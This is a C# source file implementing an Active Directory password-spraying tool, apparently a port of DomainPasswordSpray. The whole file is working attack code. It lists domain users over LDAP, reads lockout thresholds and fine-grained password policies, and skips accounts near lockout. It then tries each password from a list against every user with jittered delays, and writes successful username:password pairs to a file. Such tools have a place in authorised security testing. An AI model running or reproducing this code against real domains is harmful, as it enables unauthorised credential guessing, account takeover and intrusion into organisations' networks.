using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.DirectoryServices.ActiveDirectory;


namespace A
{
    /// <summary>
    /// LDAP Utilization -- System.DirectoryServices.ActiveDirectory
    /// C# Implementation of: https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1
    /// </summary>
    internal class Sb : IDisposable
    {
        #region Data Members

        private Options _options;
        private Queue<string> _passwordQueue;
        private HashSet<string> _userList;
        private readonly object _lock = new object();
        private Domain _domain;
        private string _domainDistinguishedName;
        private int _observationWindow;

        private volatile bool _running;
        private readonly CancellationTokenSource _cancellationTokenSource;
        private CancellationToken _cancellationToken;
        private readonly ReaderWriterLock _readerWriterLock = new ReaderWriterLock();

        // Store list of users with sucess login, to avoid re-checks
        private HashSet<string> _validUsers;

        private readonly ConcurrentBag<Task> _tasks;

        private enum MessageColor
        {
            Red,
            Yellow,
            Green,
            Blue
        }

        #endregion

        #region ctor

        public Sb()
        {
            _cancellationTokenSource = new CancellationTokenSource();
            _cancellationToken = _cancellationTokenSource.Token;
            _tasks = new ConcurrentBag<Task>();
        }

        #endregion

        #region Workers

        public void Abort()
        {
            try
            {
                Messenger.YellowMessage("[*] Abort...");

                _running = false;

                if (!_cancellationTokenSource.IsCancellationRequested)
                    _cancellationTokenSource.Cancel();

                foreach (var task in _tasks)
                {
                    try
                    {
                        task.Wait();
                    }
                    catch (AggregateException aex)
                    {
                        aex.Handle(x => true);
                    }
                    catch
                    {
                        //
                    }
                }

                Messenger.YellowMessage("[*] Aborted.");
            }
            catch (Exception)
            {
                //
            }
        }

        public void Start()
        {
            Verbose($"[*] Password spraying has begun with {_passwordQueue.Count} passwords", MessageColor.Yellow);
            Verbose("[*] This might take a while depending on the total number of users & passwords.", MessageColor.Yellow);


            _running = true;

            var t = new Task(StartSprayMasterWorker, _cancellationToken, TaskCreationOptions.LongRunning);
            _tasks.Add(t);
            t.Start();
            t.Wait(_cancellationToken);
        }

        private void StartSprayMasterWorker()
        {
            var attemptMadeCount = 0;
            var rand = new Random();

            var domain = _domainDistinguishedName;

            if(!_options.OutsideDomain)
                domain = $"LDAP://{_domain.Name}/{_domainDistinguishedName}";

            while (_running && !_cancellationToken.IsCancellationRequested)
            {
                try
                {
                    var password = GetNextPassword();
                    if (password == null)
                        break;

                    var timeNow = DateTime.Now;
                    Verbose( $"[*] Now trying password {password} against {_userList.Count} users. Current time is {timeNow.ToString(GetDateTimeFormat())}", MessageColor.Yellow);


                    foreach (var user in _userList)
                    {
                        if (!_running || _cancellationToken.IsCancellationRequested)
                            break;

                        if (IsUserFound(user))
                            continue;

                        attemptMadeCount++;

                        var isSuccess = AttemptAuth(domain, user, password);

                        if (isSuccess)
                        {
                            _validUsers.Add(user);
                            Messenger.GoodMessage($"[*] SUCCESS! User:{user} Password:{password}");
                            WriteToFile($"{user}:{password}\n");
                        }

                        var delay = GetDelayRandom(_options.DelayBetweenEachAuthAttempt, _options.Jitter, rand);

                        Thread.Sleep(delay);
                    }


                    Verbose($"{attemptMadeCount} attempts were made so far. ", MessageColor.Blue);


                    if (IsPasswordQueueEmpty())
                    {
                        Verbose("Complete!", MessageColor.Blue);
                        return;
                    }


                    // More sleeps
                    Sleep();
                    var x = GetDelayRandom(_options.DelayBetweenEachAuthAttempt, _options.Jitter, rand);
                    Thread.Sleep(x);
                }
                catch (OperationCanceledException)
                {
                    //
                }
                catch (Exception e)
                {
                    Verbose($"[-] {e.Message}", MessageColor.Red);
                }
            }
        }

        private int GetDelayRandom(int seconds, int jitter, Random random)
        {
            if (seconds == 0)
                return 0;

            return random.Next((1 - jitter) * seconds, (1 + jitter) * seconds);
        }

        private void Sleep()
        {
            Verbose($"[*] Pausing for {_observationWindow} minutes to avoid account lockout", MessageColor.Blue);
            Thread.Sleep(TimeSpan.FromMinutes(_observationWindow));
        }


        private bool AttemptAuth(string domain, string user, string password)
        {
            try
            {
                var x = new DirectoryEntry(domain, user, password);
                return x.Name != null;
            }
            catch (DirectoryServicesCOMException )
            {
                return false;
            }
        }

        private string GetNextPassword()
        {
            lock (_lock)
            {
                if (_passwordQueue.Count > 0)
                    return _passwordQueue.Dequeue();

                return null;
            }
        }

        private bool IsPasswordQueueEmpty()
        {
            lock (_lock)
                return _passwordQueue.Count == 0;
        }
        private bool IsUserFound(string user)
        {
            lock (_lock)
                return _validUsers.Contains(user);
        }
      
        #endregion


        #region Init

        public bool Init(Options optionsObj)
        {
            _options = optionsObj ?? throw new ArgumentNullException(nameof(optionsObj));


            _passwordQueue = new Queue<string>();
            _userList = new HashSet<string>();
            _validUsers = new HashSet<string>();
            _running = false;


            // Init connections
            if (!InitDomainObj())
                return false;


            if (!InitPassList())
            {
                Messenger.RedMessage("[-] The -p or --pl option must be specified");
                return false;
            }


            if (!InitUserList())
            {
                Messenger.RedMessage("[-] Could not build the user list. Provide a user list file path of users with the option -u");
                return false;
            }


            if (_options.OutsideDomain)
                InitSettingsNonDomainJoined();


            Verbose($"[*] The domain password policy observation window is set to {_observationWindow} minutes.", MessageColor.Yellow);
            Verbose($"[*] Setting a {_observationWindow} minute wait in between sprays.", MessageColor.Yellow);


            if (_passwordQueue.Count > 0)
            {
                Messenger.YellowMessage("[*] WARNING - Be very careful not to lock out accounts with the -k --pl option!");
            }
            return true;
        }

        private bool InitDomainObj()
        {
            try
            {
                _options.Domain = _options?.Domain?.Trim();


                if (_options.OutsideDomain)
                {
                    if (string.IsNullOrEmpty(_options.Domain))
                        throw new Exception();

                    if (!_options.Domain.Contains("."))
                    {
                        _domainDistinguishedName = $"LDAP://{_options.DcIp}/{_options.Domain}";
                    }
                    else
                    {
                        var parts = _options.Domain.Split('.');
                        var d = string.Empty;

                        foreach (var part in parts)
                        {
                            d += $"DC={part},";
                        }

                        d = d.TrimEnd(',');
                        _domainDistinguishedName = $"LDAP://{_options.DcIp}/{d}";
                    }
                    return true;
                }

                if (!string.IsNullOrEmpty(_options.Domain))
                {
                    // Using domain specified with -Domain option
                    var directoryContext = new DirectoryContext(DirectoryContextType.Domain, _options.Domain);
                    _domain = Domain.GetDomain(directoryContext);
                }
                else
                {
                    // Trying to use the current user's domain
                    _domain = Domain.GetCurrentDomain();
                }

                var dirEntry = new DirectoryEntry("LDAP://RootDSE");
                _domainDistinguishedName = dirEntry.Properties["defaultNamingContext"].Value?.ToString();

                return true;
            }
            catch (Exception)
            {
                if(string.IsNullOrEmpty(_options.Domain))
                    Messenger.RedMessage("[-] Could not connect to the domain. Try specifying the domain name with the -d option.");
                else
                    Messenger.RedMessage($"[-] Could not connect to the domain {_options.Domain}");

                return false;
            }
        }

        private int GetObservationWindow()
        {
            //TODO: Find another way to do it.

            var defaultVal = 31;

            try
            {
                var x = new LocalCmd();
                x.RunCmd("net accounts /domain");

                if (x.GetLastError() != null)
                    throw new Exception(x.GetLastError());

                var c = x.GetLastCommandOutput();

                if (string.IsNullOrEmpty(c))
                    return defaultVal;

                var z = Regex.Split(c, "\r\n|\r|\n");

                var s = z.SingleOrDefault(l => l.ToLower().Contains("lockout observation window"))?.ToLower();
                if (string.IsNullOrEmpty(s))
                    return defaultVal;

                s = Regex.Replace(s, "\\s+|\r\n|\r|\n", string.Empty).Split(':')[1];

                return int.Parse(s);

            }
            catch (Exception e)
            {
                Messenger.RedMessage($"[-] Obtain Domain Lockout Observation Window. {e.Message}");
                Messenger.YellowMessage($"[-] Default to: {defaultVal} minutes");
            }

            return defaultVal;
        }


        private bool InitUserList()
        {
            // User list
            if (!string.IsNullOrEmpty(_options.UserListFilePath) && File.Exists(_options.UserListFilePath))
            {
                var users = File.ReadAllLines(_options.UserListFilePath);

                foreach (var u in users)
                {
                    if (string.IsNullOrEmpty(u?.Trim()) || string.IsNullOrWhiteSpace(u.Trim()))
                        continue;

                    _userList.Add(u.Trim());
                }
            }
            else
            {
                var users = FetchUerList();
                foreach (var user in users)
                {
                    _userList.Add(user);
                }
            }

            return _userList.Count > 0;
        }


        private bool InitPassList()
        {
            if (!string.IsNullOrEmpty(_options.Password) && !string.IsNullOrWhiteSpace(_options.Password))
            {
                _passwordQueue.Enqueue(_options.Password.Trim());
            }
            else if (!string.IsNullOrEmpty(_options.PasswordListFilePath) && File.Exists(_options.PasswordListFilePath))
            {
                var passList = File.ReadAllLines(_options.PasswordListFilePath);

                foreach (var p in passList)
                {
                    if (string.IsNullOrEmpty(p?.Trim()) || string.IsNullOrWhiteSpace(p.Trim()))
                        continue;

                    _passwordQueue.Enqueue(p.Trim());
                }
            }

            return _passwordQueue.Count > 0;

        }

        private void InitSettingsNonDomainJoined()
        {
            _observationWindow = _options.DelayBetweenEachSprayAttempt;

            if (_observationWindow == 0)
                _observationWindow = 32;

            if (_options.Jitter == 0)
                _options.Jitter = 1;

            if (_options.DelayBetweenEachAuthAttempt == 0)
                _options.DelayBetweenEachAuthAttempt = 1;
        }

        #endregion

        #region Build User List

        /// <summary>
        /// Fetch user list from AD using the current user domain context
        /// </summary>
        /// <returns></returns>
        public List<string> FetchUerList()
        {
            try
            {
                // Lockout Observation Window, and add extra 2 minutes To avoid potential lockouts
                _observationWindow = GetObservationWindow() + 2;

                // Selecting the lowest account lockout threshold in the domain to avoid potential lockouts
                var smallestLockoutThreshold = GetFineGrainedPasswordPolicy().Min();
                Verbose("[*] Now creating a list of users to spray...", MessageColor.Yellow);

                if (smallestLockoutThreshold == 0)
                {
                    Verbose("[*] There appears to be no lockout policy.", MessageColor.Yellow);
                }
                else
                {
                    Verbose($"[*] The smallest lockout threshold discovered in the domain is {smallestLockoutThreshold} login attempts.", MessageColor.Yellow);
                }


                var dirEntry = new DirectoryEntry("LDAP://" + _domainDistinguishedName);
                var userSearcher = new DirectorySearcher(dirEntry);

                userSearcher.PropertiesToLoad.Add("samaccountname");
                userSearcher.PropertiesToLoad.Add("lockouttime");
                userSearcher.PropertiesToLoad.Add("badpwdcount");
                userSearcher.PropertiesToLoad.Add("badpasswordtime");

                if (_options.RemoveDisabled)
                {
                    Verbose("[*] Removing disabled users from list.", MessageColor.Yellow);

                    // More precise LDAP filter UAC check for users that are disabled (Joff Thyer)
                    // LDAP 1.2.840.113556.1.4.803 means bitwise &
                    // uac 0x2 is ACCOUNTDISABLE
                    // uac 0x10 is LOCKOUT
                    // See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/

                    userSearcher.Filter = $"(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2){_options.Filter})";
                }
                else
                {
                    userSearcher.Filter = $"(&(objectCategory=person)(objectClass=user){_options.Filter})";
                }

                // Grab batches of 1000 in results
                userSearcher.PageSize = 1000;
                var userObjects = userSearcher.FindAll();

                var userObjectsFiltered = RemoveUnwantedUsers(userObjects);

                Verbose($"[*] There are {userObjectsFiltered.Count} total users found.", MessageColor.Yellow);


                if (_options.RemovePotentialLockouts)
                {
                    Verbose("[*] Removing users within 1 attempt of locking out from list.", MessageColor.Yellow);
                    userObjectsFiltered = RemovePotentialLockouts(userObjectsFiltered, smallestLockoutThreshold, _observationWindow);
                }

                var userNameList = userObjectsFiltered.Select(u => u.Properties["samaccountname"]?[0].ToString()).ToList();
                userNameList = userNameList.Where(x => !x.StartsWith("$")).ToList();

                Verbose($"[*] Created a userlist containing {userNameList.Count()} users gathered from the current user's domain.", MessageColor.Yellow);
                return userNameList;

            }
            catch (Exception e)
            {
                Messenger.RedMessage($"[-] Failed to build user list. {e.Message}");
                return new List<string>();
            }
        }

        public List<string> FetchUerList(Options optionsObj)
        {
            _options = optionsObj ?? throw new ArgumentNullException(nameof(optionsObj));

            if (_domain != null)
                return FetchUerList();


            // Init connections
            if (!InitDomainObj())
                return null;

            return FetchUerList();
        }


        /// <summary>
        /// Remove MS Exchange built-in accounts and other built-ins
        /// </summary>
        /// <param name="users"></param>
        /// <returns></returns>
        private static List<SearchResult> RemoveUnwantedUsers(IEnumerable users)
        {
            var result = new List<SearchResult>();
            foreach (SearchResult user in users)
            {
                var name = user.Properties["samaccountname"]?[0].ToString();

                if (name != null && (name.StartsWith("HealthMailbox") && name.Length == 20))
                    continue;

                if (name != null && (name.StartsWith("SM_") && name.Length == 20))
                    continue;

                result.Add(user);

            }

            return result;
        }


        private static List<SearchResult> RemovePotentialLockouts(IEnumerable users, int smallestLockoutThreshold, int observationWindow)
        {
            var result = new List<SearchResult>();

            foreach (SearchResult user in users)
            {

                // Getting bad password counts and lst bad password time for each user
                int.TryParse(user.Properties["badpwdcount"]?[0]?.ToString(), out var badCount);
                string badPasswordTime;

                try
                {
                    badPasswordTime = user.Properties["badpasswordtime"]?[0].ToString();
                }
                catch (Exception)
                {
                    //result.Add(user);
                    continue;
                }


                var now = DateTime.Now;
                var lastBadPwd = Helpers.ParseAdDateTime(badPasswordTime);

                if (lastBadPwd == null)
                {
                    //result.Add(user);
                    continue;
                }

                var timeDiff = (now - lastBadPwd).Value.TotalMinutes;
                var attemptsUntilLockout = smallestLockoutThreshold - badCount;

                if (badCount > 0)
                {

                    if (timeDiff > observationWindow || attemptsUntilLockout > 1)
                    {
                        result.Add(user);
                    }
                }
                else if (badCount == 0 && attemptsUntilLockout > 1)
                {
                    result.Add(user);
                }
            }

            return result;
        }


        /// <summary>
        /// Generate a user list from the domain
        /// Selecting the lowest account lockout threshold in the domain to avoid potential lockouts
        /// </summary>
        /// <returns>List(int) of account Lockout Thresholds</returns>
        private List<int> GetFineGrainedPasswordPolicy()
        {
            var accountLockoutThresholds = new List<int>();

            try
            {
                // Setting the current domain's account lockout threshold
                var objDeDomain = $"LDAP://{_domain.PdcRoleOwner}";
                var directorySearcher = new DirectoryEntry(objDeDomain);

                accountLockoutThresholds.Add((int)directorySearcher.Properties["lockoutthreshold"].Value);


                // Getting the AD behavior version to determine if fine-grained password policies are possible

                var behaviorVersion = (int)directorySearcher.Properties["lockoutthreshold"][0];
                if (behaviorVersion >= 3)
                {
                    Verbose("[*] Current domain is compatible with Fine-Grained Password Policy", MessageColor.Yellow);

                    var adSearcher = new DirectorySearcher();
                    adSearcher.SearchRoot = directorySearcher;
                    adSearcher.Filter = "(objectclass=msDS-PasswordSettings)";

                    using (var psoList = adSearcher.FindAll())
                    {
                        if (psoList.Count > 0)
                        {
                            Verbose($"[*] A total of {psoList.Count} Fine-Grained Password policies were found.", MessageColor.Yellow);

                            foreach (SearchResult entry in psoList)
                            {
                                // Selecting the lockout threshold, min pwd length, and which
                                // groups the fine-grained password policy applies to

                                var psoFineGrainedPolicy = entry.Properties;
                                var psoPolicyName = psoFineGrainedPolicy["name"]?[0]?.ToString();
                                var psoLockoutThreshold = psoFineGrainedPolicy["msds-lockoutthreshold"][0]?.ToString();
                                //var psoAppliesTo = psoFineGrainedPolicy["msds-psoappliesto"]?[0]?.ToString();
                                var psoAppliesTo = ListToString(psoFineGrainedPolicy["msds-psoappliesto"]);
                                var psoMinPwdLength = psoFineGrainedPolicy["msds-minimumpasswordlength"]?[0]?.ToString();

                                // adding lockout threshold to array for use later to determine which is the lowest.
                                accountLockoutThresholds.Add(Convert.ToInt32(psoLockoutThreshold));

                                Verbose($"[*] Fine-Grained Password Policy titled: {psoPolicyName} has a lockout threshold of {psoLockoutThreshold} attempts, minimum password length of {psoMinPwdLength} chars, and applies to {psoAppliesTo}", MessageColor.Yellow);

                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Messenger.RedMessage($"[-] Unable to obtain Fine-Grained Password Policy. {e.Message}");
            }

            return accountLockoutThresholds;
        }
     
        #endregion

        #region Helpers

        private void WriteToFile(string info)
        {
            if (string.IsNullOrEmpty(_options.OutFile))
                return;

            try
            {
                _readerWriterLock.AcquireWriterLock(int.MaxValue);
                using (var file = new FileStream(_options.OutFile, FileMode.Append, FileAccess.Write, FileShare.Read))
                using (var writer = new StreamWriter(file, Encoding.Unicode))
                {
                    writer.Write(info);
                }
            }
            catch
            {
                //
            }
            finally
            {
                _readerWriterLock.ReleaseWriterLock();
            }
        }

        private string GetDateTimeFormat()
        {
            return "yyyy-MM-dd h:mm:ss tt";
        }

        private void Verbose(string message, MessageColor color)
        {
            if (!_options.Verbose)
                return;

            if (color == MessageColor.Yellow)
                Messenger.YellowMessage(message);
            else if (color == MessageColor.Blue)
                Messenger.BlueMessage(message);
            else if (color == MessageColor.Red)
                Messenger.RedMessage(message);
            else if (color == MessageColor.Green)
                Messenger.GoodMessage(message);
        }



        private static string ListToString(ResultPropertyValueCollection collection)
        {
            if (collection.Count == 1)
                return collection[0]?.ToString();

            var e = collection.GetEnumerator();

            var list = new List<string>();
            while (e.MoveNext())
            {
                list.Add(e.Current?.ToString());
            }

            return ListToString(list);
        }

        private static string ListToString(IEnumerable<string> list)
        {
            return string.Join(" | ", list).Trim().TrimEnd('|').TrimEnd(' ');
        }


        #endregion


        public void Dispose()
        {
            try
            {
                foreach (var task in _tasks)
                    task?.Dispose();

                while (!_tasks.IsEmpty)
                    _tasks.TryTake(out _);
            }
            catch
            {
                //
            }
        }

    }
}
